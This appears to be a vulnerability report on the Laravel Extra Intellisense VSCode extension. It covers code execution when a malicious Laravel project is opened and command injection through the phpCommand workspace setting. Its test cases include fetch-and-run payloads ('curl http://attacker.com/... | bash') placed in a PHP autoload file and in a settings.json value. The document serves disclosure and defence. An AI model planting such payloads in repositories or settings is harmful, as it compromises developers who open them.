# Laravel Extra Intellisense Extension Vulnerabilities

## Vulnerability name: Remote Code Execution via Malicious Laravel Project Files

### Description
The Laravel Extra Intellisense extension executes PHP code to analyze Laravel projects for providing autocompletion features. When a user opens a repository with this extension installed, it automatically loads and executes PHP files from the project, including vendor/autoload.php and bootstrap/app.php, as well as model files. If an attacker creates a malicious Laravel repository with specially crafted PHP files, they can achieve arbitrary code execution on the victim's machine.

Step by step how someone can trigger vulnerability:
1. An attacker creates a malicious Laravel project repository with modified PHP files
2. The attacker adds malicious code to key files like vendor/autoload.php or bootstrap/app.php
3. The victim opens this repository in VSCode with the Laravel Extra Intellisense extension installed
4. The extension automatically analyzes the project by executing PHP code that requires these files
5. The malicious PHP code executes on the victim's system with the privileges of the VSCode process

### Impact
This vulnerability allows arbitrary code execution on the victim's machine. An attacker can:
- Execute any command with the victim's privileges
- Access, modify, or exfiltrate sensitive files
- Install malware or backdoors
- Pivot to other systems on the victim's network

### Vulnerability rank
Critical

### Currently implemented mitigations
The extension attempts to capture and log errors from PHP execution, but this doesn't prevent the execution of malicious code. The README includes a security note warning users about the extension executing the Laravel application automatically, but does not specifically warn about opening untrusted repositories.

### Missing mitigations
- The extension should sandbox or isolate PHP code execution
- Implement content validation or filtering to detect potentially malicious code patterns
- Use a more restrictive execution model that doesn't require loading the entire Laravel bootstrap
- Add specific warnings about opening untrusted repositories

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed in VSCode
- The victim must open a malicious repository

### Source code analysis
In `helpers.ts`, the `runLaravel` function loads and executes PHP code from the Laravel project:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // ... more code ...
```

The extension also directly includes model files in `EloquentProvider.ts`:

```typescript
"foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
"   if (is_dir(base_path($modelPath))) {" +
"      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
"         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
"             include_once base_path(\"$modelPath/$sourceFile\");" +
"         }" +
"      }" +
"   }" +
"}"
```

The code is executed via `cp.exec` in the `runPhp` method:

```typescript
cp.exec(command,
    { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
    function (err, stdout, stderr) {
        // ... handle output ...
    }
);
```

### Security test case
1. Create a malicious Laravel project with the following modified vendor/autoload.php file:
```php
<?php
// Malicious code for proof of concept
file_put_contents('/tmp/pwned.txt', 'System compromised by malicious Laravel project');
// Continue with normal autoload functionality or simulate it
// require_once '/path/to/real/autoload.php';
```

2. Open this project in VSCode with the Laravel Extra Intellisense extension installed

3. Verify that the file `/tmp/pwned.txt` is created, proving code execution

4. An actual attacker might use more sophisticated payloads like:
```php
<?php
exec('curl http://attacker.com/payload.sh | bash');
// Continue with normal autoload functionality
```

## Vulnerability name: Command Injection via Workspace Settings

### Description
The Laravel Extra Intellisense extension uses a configurable `phpCommand` setting to execute PHP code. If a victim opens a repository with malicious workspace settings (.vscode/settings.json), the attacker can achieve command injection through the `phpCommand` configuration value.

Step by step how someone can trigger vulnerability:
1. An attacker creates a repository with a malicious .vscode/settings.json file
2. The attacker configures the `LaravelExtraIntellisense.phpCommand` setting to include command injection
3. The victim opens this repository in VSCode with the Laravel Extra Intellisense extension installed
4. The victim accepts the workspace settings when prompted by VSCode
5. When the extension executes PHP code (which happens automatically), the injected commands also execute

### Impact
This vulnerability allows arbitrary command execution on the victim's machine. An attacker can:
- Execute any command with the victim's privileges
- Access, modify, or exfiltrate sensitive files
- Install malware or backdoors
- Compromise other systems on the victim's network

### Vulnerability rank
High

### Currently implemented mitigations
VSCode typically prompts users before applying workspace settings, providing some protection if users reject untrusted settings. The README includes configuration examples that might make users more likely to accept workspace settings.

### Missing mitigations
- The extension should validate and sanitize the `phpCommand` setting
- Implement a whitelist of allowed command templates
- Warn users specifically about the danger of untrusted workspace settings

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed
- The victim must open a malicious repository
- The victim must accept the workspace settings when prompted by VSCode

### Source code analysis
In `helpers.ts`, the `runPhp` function uses the user-configurable `phpCommand` setting:

```typescript
let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
let command = commandTemplate.replace("{code}", code);
```

This command is then executed using Node.js's child_process.exec:

```typescript
cp.exec(command,
    { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
    function (err, stdout, stderr) {
        // ... handle output ...
    }
);
```

If an attacker can control the `phpCommand` setting via workspace settings, they can inject arbitrary shell commands by including shell metacharacters like `&`, `|`, or `;`.

### Security test case
1. Create a repository with a .vscode/settings.json file containing:
```json
{
    "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & echo 'Command injection successful' > /tmp/cmd_injected.txt"
}
```

2. Open this repository in VSCode with the Laravel Extra Intellisense extension installed

3. When prompted by VSCode, accept the workspace settings

4. Verify that the file `/tmp/cmd_injected.txt` is created, proving command injection

5. An actual attacker might use a more harmful payload like:
```json
{
    "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & curl -s http://attacker.com/shell.sh | bash"
}
